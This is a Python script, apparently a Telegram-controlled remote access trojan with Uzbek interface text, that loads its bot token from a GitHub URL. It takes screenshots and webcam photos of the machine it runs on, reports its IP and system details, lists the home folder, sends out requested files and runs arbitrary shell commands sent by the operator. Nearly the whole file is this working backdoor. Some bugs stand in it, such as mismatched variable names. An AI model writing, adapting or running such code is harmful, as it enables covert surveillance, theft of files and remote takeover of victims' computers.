#!/usr/bin/python3

from PIL import ImageGrab
from io import BytesIO
import subprocess, requests, telebot, platform, cv2, os

os.system("clear")

token_url = "https://raw.githubusercontent.com/cf9cefec9fe949410174bbe6ce6ee566/cf9cefec9fe949410174bbe6ce6ee566/main/README.md"

tok = requests.get(token_url)

TOKEN = tok.text

bot = telebot.TeleBot(TOKEN.strip())
bot.set_webhook()

cd = os.path.expanduser("~")

########   Start

@bot.message_handler(commands=['start'])

def start(message):

        bot.send_message(message.chat.id, "🟣 Assalomu alaykum \n\n Screenshot olish - /screenshot \n Web Camera - /camera \n IP address - /ip \n Full info - /systeminfo \n Folder ichini ko'rish - /ls [Folder name] \n Fayl yuklab olish - /upload [File name] \n Shell - /shell")

########   Screenshot

@bot.message_handler(commands=['screenshot'])

def screenshot(message):

        screen_image = ImageGrab.grab()

        output = BytesIO()

        screen_image.save(output, format='PNG')

        bot.send_photo(message.chat.id, output.getvalue())

########   Web Camera

os.system("clear")

@bot.message_handler(commands=['camera'])

def camera(message):

        try:

                cap = cv2.VideoCapture(0)

                if not cap.isOpened():

                        bot.send_message(message.chat.id, "Web camerani ochib bo'lmadi! ")

                        os.system("clear")

                else:

                        ret, frame = cap.read()

                        if ret:

                                cv2.imwrite("webcam.jpg", frame)

                                with open("webcam.jpg", "rb") as phone_file:

                                        bot.send_photo(message.chat.id, photo=photo_file)

                                os.remove("webcam.jpg")

                        else:

                                bot.send_message(message.chat.id, "Rasm olish xatolik yuz berdi! ")

                                os.system("clear")

                cap.relese()

        except Exception as webcam_error:

                bot.send_message(message.chat.id, f"Xatolik yuz berdi : {webcam_error}")

                os.system("clear")

########   IP

os.system("clear")

@bot.message_handler(commands=['ip'])

def ip_address(message):

        try:

                result = subprocess.run(['curl', 'ipinfo.io/ip'], capture_output=True, text=True)

                if result.returncode == 0:

                        user_ip = result.stdout.strip()

                        bot.reply_to(message, f"Foydalanuvchining IP manzili: {user_ip}")

                else:

                        bot.reply_to(message, "IP manzilini olishda xatolik yuz berdi. Iltimos, qaytadan urinib ko'ring.")

        except Exception as ip_error:

                bot.reply_to(message, f"Xatolik: {str(e)}")

########   Systeminfo

os.system("clear")

@bot.message_handler(commands=['systeminfo'])

def systeminfo(message):

        system_info = {

                'Platform': platform.platform(),
                'System': platform.system(),
                'Node Name': platform.node(),
                'Release': platform.release(),
                'Version': platform.version(),
                'Machine': platform.machine(),
                'Processor': platform.processor(),
                'CPU Cores': os.cpu_count(),
                'Username': os.getlogin(),

        }

        system_info_text = '\n'.join(f"{key}: {value}" for key, value in system_info.items())
        bot.reply_to(message, system_info_text)

########   ls

@bot.message_handler(commands=['ls'])

def list_directory(message):

        try:

                contents = os.listdir(cd)

                if not contents:

                        bot.send_message(message.chat.id, "folder is empty.")

                else:

                        response = "Directory content :\n"

                        for item in contents:

                                response += f"- {item}\n"

                        bot.send_message(message.chat.id, response)

        except Exception as e:

                bot.send_message(message.chat.id, f"An error occurred : {str(e)}")

########   Upload

@bot.message_handler(commands=['upload'])

def upload(message):

        try:

                args = message.text.split(' ')

                if len(args) >= 2:

                        file_path = args[1]

                        if os.path.exists(file_path):

                                with open(file_path, "rb") as file:

                                        bot.send_document(message.chat.id, file)

                                bot.send_message(message.chat.id, f"Fayl muvaffaqiyatli uzatildi! ")

                        else:

                                bot.send_message(message.chat.id, "Bunday fayl mavjud emas! ")

                else:

                        bot.send_message(message.chat.id, "Buyruqni noto'g'ri ishlatdingiz /upload [File_name]")

        except Exception as upload_error:

                bot.send_message(message.chat.id, f"Xatolik yuz berdi : {str(upload_error)}")

########   Shell

is_shell_command_given = False

@bot.message_handler(func=lambda message: True)

def handle_all_messages(message):

        global is_shell_command_given

        try:

                if message.text.startswith('/shell'):

                        is_shell_command_given = True

                elif is_shell_command_given:

                        command = message.text

                        if command == "exit":

                                bot.send_message(message, "Shelldan tashqariga chiqdingiz! ")

                                is_shell_command_given = False

                                return

                        elif command.startswith('get '):

                                filename = command[4:]

                                if os.path.exists(filename):

                                        with open(filename, 'rb') as file:

                                                bot.send_document(message.chat.id, file)

                                else:

                                        bot.reply_to(message, f"Fayl topilmadi: {filename}")

                        else:

                                result = run_command(command)
                                bot.reply_to(message, result)

                else:

                        print("joyi")

        except Exception as shell_error:

                bot.reply_to(message, f"Xatolik yuz berdi : {str(shell_error)}")

def run_command(command):

        try:

                result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=10)
                output = result.stdout if result.stdout else result.stderr

                if result.returncode != 0:

                        output += f"Xatolik yuz berdii : {result.returncode}"

                return output.strip()

        except Exception as runcommand_error:

                return "Amal bajarish muddati tuzatildi."

bot.polling()